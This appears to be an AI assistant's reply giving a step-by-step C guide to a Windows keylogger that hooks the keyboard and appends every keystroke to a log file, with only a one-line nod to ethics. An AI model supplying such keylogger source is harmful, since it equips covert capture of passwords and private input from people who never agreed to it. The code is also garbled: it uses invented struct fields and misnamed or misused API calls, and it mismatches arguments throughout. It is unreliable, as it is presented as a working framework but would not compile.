To create a keystroke-logging application on a Windows computer, you can use the Windows API's keyboard hook. Here's a step-by-step guide to implementing this:

### Step 1: Include Necessary Headers
Include the required header files for Windows and user input:
```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <time.h>
```

### Step 2: Define Constants and Data Structures
Define constants for the hook type, key states, and the maximum number of keystrokes to log:
```c
#define WH_KEYBOARD_LL 2
#define ID_KEYHOOK 1
#define MAX_LOG_SIZE 1000

static int keyhook_id = 0;
static HWND hwnd = NULL;
static FILE *log_file = NULL;
static int log_count = 0;
static char log_buffer[256];

static DWORD last_time = 0;
static DWORD keyhook_thread = 0;
static HANDLE hhook = NULL;
```

### Step 3: Define the Callback Function
The callback function will handle keyboard events:
```c
LRESULT CALLBACK keyhook_proc(int code, int wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
    BYTE key = pKb->wVk;
    BYTE shift = pKb->wShiftKey;
    WORD key_state = pKb->wKeyState;

    if (code == HC_KEYDOWN) {
        // Record key press
        if (key != 0) {
            // Check modifiers
            bool ctrl = (shift & 0x1) != 0;
            bool shift = (shift & 0x2) != 0;
            bool alt = (shift & 0x4) != 0;

            // Record keystroke with modifiers
            // Append to log file
            if (fopen_s(&log_file, "a") == 0) {
                fprintf(log_file, "[%s] %c %c %d\n", CurrentTime(), key, (ctrl ? 1 : 0), (shift ? 1 : 0), (alt ? 1 : 0));
                fflush(log_file);
            }
            log_count++;
            if (log_count >= MAX_LOG_SIZE) {
                // Rotate or clear log if needed
            }
        }
    }
    return CallNextHook(code, wParam, lParam);
}
```

### Step 4: Initialize the Hook
In the main function, set up the hook:
```c
int main() {
    // Check if hook is already installed
    if (hook == NULL) {
        // Get the main window handle
        hwnd = GetForegroundWindow(NULL);

        // Set up the hook
        hook = SetWindowsHook(WH_KEYBOARD_LL, keyhook_proc);

        // Check if hook was installed
        if (hook == NULL) {
            printf("Failed to install keyboard hook.\n");
            return 1;
        }
    }

    // Start the hook
    keyhook_thread = CreateThread(NULL, NULL, keyhook_proc, NULL, &keyhook_thread, 0);

    // Wait for keystrokes
    while (true) {
        Sleep(1);
        // Check if the window changed to avoid high CPU usage
        HWND active_window = GetForegroundWindow(NULL);
        if (active_window != hwnd) {
            hwnd = active_window;
            // Re-set the hook if necessary
            // ...
        }
    }

    // Release the hook
    Unhook(keyhook_id, hook);
    // Cleanup other resources
    if (log_file) {
        fclose(log_file);
    }
    return 0;
}
```

### Step 5: Compile and Run
Compile the code using a C compiler and ensure it's run with admin privileges if needed.

### Notes:
- **Ethical Considerations**: Ensure the code is used ethically and with proper authorization.
- **Error Handling**: Add error checks and exception handling to manage potential issues.
- **Performance**: Monitor system performance to ensure the hook doesn't cause significant slowdowns.
- **Log Management**: Implement log rotation or archiving to manage large log sizes.

This code provides a basic framework for logging keystrokes, but you may need to adjust it based on specific requirements and testing.<｜end▁of▁sentence｜>

